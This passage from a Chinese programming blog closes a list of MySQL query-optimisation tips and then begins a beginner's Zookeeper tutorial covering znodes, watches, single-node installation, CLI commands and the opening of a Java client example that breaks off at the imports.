  <li>查询SQL尽量不要使用<code>select *</code>，而是<code>select</code>具体字段</li>
  <li>如果知道查询结果只有一条或者只要最大/最小一条记录，建议用<code>limit 1</code></li>
  <li>应尽量避免在<code>where</code>子句中使用<code>or</code>来连接条件</li>
  <li>注意优化<code>limit</code>深分页问题</li>
  <li>使用<code>where</code>条件限定要查询的数据，避免返回多余的行</li>
  <li>尽量避免在索引列上使用<code>mysql</code>的内置函数</li>
  <li>应尽量避免在 <code>where</code>子句中对字段进行表达式操作</li>
  <li>应尽量避免在<code>where</code> 子句中使用<code>!=</code>或<code>&lt;&gt;</code>操作符</li>
  <li>使用联合索引时，注意索引列的顺序，一般遵循最左匹配原则。</li>
  <li>对查询进行优化，应考虑在<code>where 及 order by</code>涉及的列上建立索引</li>
  <li>如果插入数据过多，考虑批量插入</li>
  <li>在适当的时候，使用覆盖索引</li>
  <li>使用explain 分析你SQL的计划</li>
 </ul> 
<h2 id="关于我"><a class="markdownIt-Anchor" href="#关于我">#</a> 关于我</h2>
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:49.000Z" title="2023/4/27 17:20:49">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:22:38.119Z" title="2023/4/27 17:22:38">2023-04-27</time>更新</span><span class="level-item">17 分钟读完 (大约2530个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Zookeeper%E3%80%91Zookeeper%E5%85%A5%E9%97%A8%E7%9C%8B%E8%BF%99%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">【Zookeeper】Zookeeper入门看这篇就够了</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="zookeeperzookeeper入门看这篇就够了"><a class="markdownIt-Anchor" href="#zookeeperzookeeper入门看这篇就够了">#</a> 【Zookeeper】Zookeeper 入门看这篇就够了</h2>
<div id="content_views" class="htmledit_views"> <strong><a target="_blank" rel="noopener" href="https://www.roncoo.com/course/list.html?courseName=Zookeeper">Zookeeper是什么</a></strong> 
 <br> 
 <br>官方文档上这么解释zookeeper，它是一个分布式服务框架，是Apache Hadoop 的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。 
 <br> 
 <br>上面的解释有点抽象，简单来说zookeeper=文件系统+监听通知机制。 
 <br> 
 <br>1、 文件系统 
 <br> 
 <br> 
 <p>Zookeeper维护一个类似文件系统的数据结构：</p> 
 <p><img src="https://img-blog.csdn.net/201807121434154?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></p> 
 <p></p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">每个子目录项如 NameService 都被称作为 znode(目录节点)，和文件系统一样，我们能够自由的增加、删除znode，在一个znode下增加、删除子znode，唯一的不同在于znode是可以存储数据的。</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">有四种类型的znode：</p> 
 <ul style="margin-left:30px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">
  <li><p style="line-height:28px;"><span style="font-weight:bolder;">PERSISTENT-持久化目录节点</span></p><p style="line-height:28px;">客户端与zookeeper断开连接后，该节点依旧存在</p></li>
  <li><p style="line-height:28px;"><span style="font-weight:bolder;">PERSISTENT_SEQUENTIAL-持久化顺序编号目录节点</span></p><p style="line-height:28px;">客户端与zookeeper断开连接后，该节点依旧存在，只是Zookeeper给该节点名称进行顺序编号</p></li>
  <li><p style="line-height:28px;"><span style="font-weight:bolder;">EPHEMERAL-临时目录节点</span></p><p style="line-height:28px;">客户端与zookeeper断开连接后，该节点被删除</p></li>
  <li><p style="line-height:28px;"><span style="font-weight:bolder;">EPHEMERAL_SEQUENTIAL-临时顺序编号目录节点</span></p><p style="line-height:28px;">客户端与zookeeper断开连接后，该节点被删除，只是Zookeeper给该节点名称进行顺序编号</p></li>
 </ul> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">2、 监听通知机制</span></p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">客户端注册监听它关心的目录节点，当目录节点发生变化（数据改变、被删除、子目录节点增加删除）时，zookeeper会通知客户端。</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">就这么简单，下面我们看看Zookeeper能做点什么呢？</p> <span id="OSC_h1_2" style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span> <span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span> 
 <h1 id="h1_2" style="font-size:24px;font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, Arial, Helvetica, sans-serif;line-height:1.28571em;font-weight:500;color:rgb(61,70,77);background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Zookeeper能做什么</span></h1> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">zookeeper功能非常强大，可以实现诸如分布式应用配置管理、统一命名服务、状态同步服务、集群管理等功能，我们这里拿比较简单的分布式应用配置管理为例来说明。</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">假设我们的程序是分布式部署在多台机器上，如果我们要改变程序的配置文件，需要逐台机器去修改，非常麻烦，现在把这些配置全部放到zookeeper上去，保存在 zookeeper 的某个目录节点中，然后所有相关应用程序对这个目录节点进行监听，一旦配置信息发生变化，每个应用程序就会收到 zookeeper 的通知，然后从 zookeeper 获取新的配置信息应用到系统中。</p> 
 <p><img src="https://img-blog.csdn.net/20180712143454552?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></p> 
 <p></p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">如上，你大致应该了解zookeeper是个什么东西，大概能做些什么了，我们马上来学习下zookeeper的安装及使用，并开发一个小程序来实现zookeeper这个分布式配置管理的功能。</p> <span id="OSC_h1_3" style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span> <span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span> 
 <h1 id="h1_3" style="font-size:24px;font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, Arial, Helvetica, sans-serif;line-height:1.28571em;font-weight:500;color:rgb(61,70,77);background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Zookeeper单机模式安装</span></h1> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Step1</span>：配置JAVA环境，检验环境：java -version</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Step2</span>：下载并解压zookeeper</p> 
 <pre><code class="language-java"># cd /usr/local
# wget http://mirror.bit.edu.cn/apache/zookeeper/stable/zookeeper-3.4.12.tar.gz
# tar -zxvf zookeeper-3.4.12.tar.gz
# cd zookeeper-3.4.12</code></pre> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><strong>Step3</strong></span><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">：重命名配置文件zoo_sample.cfg</span><br></p> 
 <pre><code class="language-java"># cp conf/zoo_sample.cfg conf/zoo.cfg</code></pre> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><strong>Step4</strong></span><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">：启动zookeeper</span></p> 
 <pre><code class="language-java"># bin/zkServer.sh start</code></pre> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><strong>Step5</strong></span><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">：检测是否成功启动，用zookeeper客户端连接下服务端</span></p> 
 <pre><code class="language-java"># bin/zkCli.sh</code></pre> 
 <h1 id="h1_4" style="font-size:24px;font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, Arial, Helvetica, sans-serif;line-height:1.28571em;font-weight:500;color:rgb(61,70,77);background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Zookeeper使用</span></h1> <span id="OSC_h3_5" style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span> <span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span> 
 <h3 id="h3_5" style="font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, Arial, Helvetica, sans-serif;line-height:1.28571em;font-weight:500;font-size:20px;color:rgb(61,70,77);background-color:rgb(255,255,255);"><span style="font-weight:bolder;">使用客户端命令操作zookeeper</span></h3> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">1、使用 ls 命令来查看当前 ZooKeeper 中所包含的内容</p> 
 <img src="https://img-blog.csdn.net/20180712143716167?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""> 
 <br> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><br></span></p> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">2、创建一个新的 znode ，使用 create /zkPro myData</span><br></p> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/2018071214374133?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;">3、再次使用 ls 命令来查看现在 zookeeper 中所包含的内容：</span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><img src="https://img-blog.csdn.net/20180712143805771?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">4、下面我们运行 get 命令来确认第二步中所创建的 znode 是否包含我们所创建的字符串：</span><br></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/20180712143823808?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">5、下面我们通过 set 命令来对 zk 所关联的字符串进行设置：</span><br></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/2018071214384160?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">6、下面我们将刚才创建的 znode 删除</span><br></span></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/20180712143857281?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></span></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span></span></span></span></p> 
 <h3 id="h3_6" style="font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, Arial, Helvetica, sans-serif;line-height:1.28571em;font-weight:500;font-size:20px;color:rgb(61,70,77);background-color:rgb(255,255,255);"><span style="font-weight:bolder;">使用Java API操作zookeeper</span></h3> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">使用Java API操作zookeeper需要引用下面的包</p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/20180712143918407?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></span></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span></span></span></span></p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">下面我们来实现上面说的分布式配置中心：</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">1、在zookeeper里增加一个目录节点，并且把配置信息存储在里面</p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/20180712143937411?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></span></span></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">2、启动两个zookeeper客户端程序，代码如下所示</span><br></span></span></span></span></p> 
 <pre><code class="language-java">import java.util.concurrent.CountDownLatch;
import org.apache.zookeeper.WatchedEvent;
import org.apache.zookeeper.Watcher;
import org.apache.zookeeper.Watcher.Event.EventType;
